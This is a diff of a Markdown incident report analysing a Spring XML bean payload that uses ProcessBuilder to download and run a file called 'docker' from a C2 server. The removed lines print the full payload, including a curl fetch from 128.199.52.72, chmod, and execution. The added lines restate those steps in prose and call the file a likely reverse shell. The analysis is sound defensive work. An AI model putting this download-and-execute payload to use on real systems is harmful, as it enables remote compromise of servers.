@@ -31,21 +31,21 @@ The attacker used this infrastructure to distribute and execute a malicious payl
 ---
 
 ## **2. Analysis of the Malicious XML Payload**
-The payload was delivered through a malicious XML file hosted on **`146.190.21.92`**. The XML file was structured using the Spring framework and contained the following bean configuration:
+The payload was delivered through a malicious XML file hosted on **`146.190.21.92`**. The XML file was structured using the Spring framework and contained the bean configuration
 
-```xml
-<bean id="pb" class="java.lang.ProcessBuilder" init-method="start">
-    <constructor-arg>
-        <list>
-            <value>bash</value>
-            <value>-c</value>
-            <value>curl -s -o /tmp/docker http://128.199.52.72/docker; chmod +x /tmp/docker; ./tmp/docker</value>
-        </list>
-    </constructor-arg>
-</bean>
-xml```
+## **3. Explanation of the Payload**
 
-## **3. Identification of the Reverse Shell Executable**
-The XML configuration initializes an instance of java.lang.ProcessBuilder, a standard Java class used to execute system commands. The method start() is invoked to execute a shell command (bash -c), which downloads a file named docker from the second C2 server at 128.199.52.72 and saves it in the /tmp directory.
+The XML configuration initializes an instance of `java.lang.ProcessBuilder`, a standard Java class used to execute system commands. The `start()` method is invoked to execute a shell command (`bash -c`), which:
 
-The payload then changes the permissions of the file to make it executable and runs it. This tactic is a typical method used to gain initial access and control over a compromised host.
+1. Downloads a file named `docker` from the second C2 server at `128.199.52.72` and saves it in the `/tmp` directory.
+2. Changes the file's permissions to make it executable using `chmod +x /tmp/docker`.
+3. Executes the downloaded file (`./tmp/docker`).
+
+This method is a typical attack vector to gain initial access and control over a compromised host.
+
+## **4.Identification of the Reverse Shell Executable**
+
+The command contained in the XML payload indicated that the attacker downloaded a file named `docker` from the path `http://128.199.52.72/docker`. The executable was stored as `/tmp/docker` on the server. This file is likely a reverse shell executable used to establish a backdoor connection with the attacker’s infrastructure.
+
+This reverse shell would enable the attacker to maintain persistent access to the compromised server and potentially exfiltrate data or perform further malicious activities.
+
